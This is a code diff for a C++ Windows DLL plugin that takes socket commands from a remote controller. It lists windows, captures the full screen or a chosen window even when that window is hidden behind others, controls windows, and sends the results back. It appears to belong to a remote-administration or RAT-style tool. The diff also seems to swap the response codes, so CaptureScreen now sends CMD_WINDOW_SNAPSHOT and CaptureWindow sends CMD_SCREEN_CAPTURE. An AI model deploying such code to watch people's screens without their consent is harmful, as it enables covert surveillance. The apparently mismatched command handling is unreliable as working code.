@@ -42,14 +42,14 @@ void SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
     }
 }
 
-struct WindowInfo {
+struct LocalWindowInfo {
     HWND hwnd;
     std::string title;
     std::string className;
     bool isVisible;
 };
 BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
-    std::vector<WindowInfo>* windows = (std::vector<WindowInfo>*)lParam;
+    std::vector<LocalWindowInfo>* windows = (std::vector<LocalWindowInfo>*)lParam;
     
     wchar_t title[256];
     wchar_t className[256];
@@ -57,7 +57,7 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
     GetClassNameW(hwnd, className, sizeof(className)/sizeof(wchar_t));
     
     if (wcslen(title) > 0 && IsWindowVisible(hwnd)) {
-        WindowInfo info;
+        LocalWindowInfo info;
         info.hwnd = hwnd;
         info.title = WideToUTF8(title);
         info.className = WideToUTF8(className);
@@ -68,7 +68,7 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
     return TRUE;
 }
 std::string ListWindows() {
-    std::vector<WindowInfo> windows;
+    std::vector<LocalWindowInfo> windows;
     EnumWindows(EnumWindowsProc, (LPARAM)&windows);
     
     std::stringstream ss;
@@ -128,6 +128,71 @@ void CaptureScreen(SOCKET s) {
     data.insert(data.end(), (char*)&bih, (char*)&bih + sizeof(bih));
     data.insert(data.end(), lpbitmap, lpbitmap + dwBmpSize);
 
+    SendResponse(s, CMD_WINDOW_SNAPSHOT, data.data(), (int)data.size());
+
+    GlobalUnlock(hDIB);
+    GlobalFree(hDIB);
+    DeleteObject(hBitmap);
+    DeleteDC(hMemoryDC);
+    ReleaseDC(NULL, hScreenDC);
+}
+
+void CaptureWindow(SOCKET s, HWND hwnd) {
+    if (!IsWindow(hwnd)) return;
+
+    RECT rc;
+    GetWindowRect(hwnd, &rc);
+    int w = rc.right - rc.left;
+    int h = rc.bottom - rc.top;
+    if (w <= 0 || h <= 0) return;
+
+    HDC hScreenDC = GetDC(NULL);
+    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
+    SelectObject(hMemoryDC, hBitmap);
+
+    // 尝试使用 PrintWindow 捕捉窗口（即使被遮挡）
+    if (!PrintWindow(hwnd, hMemoryDC, 0)) {
+        HDC hWindowDC = GetWindowDC(hwnd);
+        BitBlt(hMemoryDC, 0, 0, w, h, hWindowDC, 0, 0, SRCCOPY);
+        ReleaseDC(hwnd, hWindowDC);
+    }
+
+    BITMAP bmp;
+    GetObject(hBitmap, sizeof(BITMAP), &bmp);
+
+    BITMAPFILEHEADER bfh;
+    BITMAPINFOHEADER bih;
+
+    bih.biSize = sizeof(BITMAPINFOHEADER);
+    bih.biWidth = bmp.bmWidth;
+    bih.biHeight = bmp.bmHeight;
+    bih.biPlanes = 1;
+    bih.biBitCount = 24;
+    bih.biCompression = BI_RGB;
+    bih.biSizeImage = 0;
+    bih.biXPelsPerMeter = 0;
+    bih.biYPelsPerMeter = 0;
+    bih.biClrUsed = 0;
+    bih.biClrImportant = 0;
+
+    DWORD dwBmpSize = ((bmp.bmWidth * bih.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
+    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
+    char* lpbitmap = (char*)GlobalLock(hDIB);
+
+    GetDIBits(hMemoryDC, hBitmap, 0, (UINT)bmp.bmHeight, lpbitmap, (BITMAPINFO*)&bih, DIB_RGB_COLORS);
+
+    bfh.bfType = 0x4D42;
+    bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
+    bfh.bfReserved1 = 0;
+    bfh.bfReserved2 = 0;
+    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+
+    std::vector<char> data;
+    data.insert(data.end(), (char*)&bfh, (char*)&bfh + sizeof(bfh));
+    data.insert(data.end(), (char*)&bih, (char*)&bih + sizeof(bih));
+    data.insert(data.end(), lpbitmap, lpbitmap + dwBmpSize);
+
     SendResponse(s, CMD_SCREEN_CAPTURE, data.data(), (int)data.size());
 
     GlobalUnlock(hDIB);
@@ -167,7 +232,11 @@ extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* p
         std::string result = ListWindows();
         SendResponse(s, CMD_WINDOW_LIST, result.c_str(), (int)result.size());
     } else if (pkg->cmd == CMD_SCREEN_CAPTURE) {
-        CaptureScreen(s);
+        if (pkg->arg1 != 0) {
+            CaptureWindow(s, (HWND)(uintptr_t)pkg->arg1);
+        } else {
+            CaptureScreen(s);
+        }
     } else if (pkg->cmd == CMD_WINDOW_CTRL) {
         HWND hwnd = (HWND)(uintptr_t)pkg->arg1;
         uint32_t action = pkg->arg2;
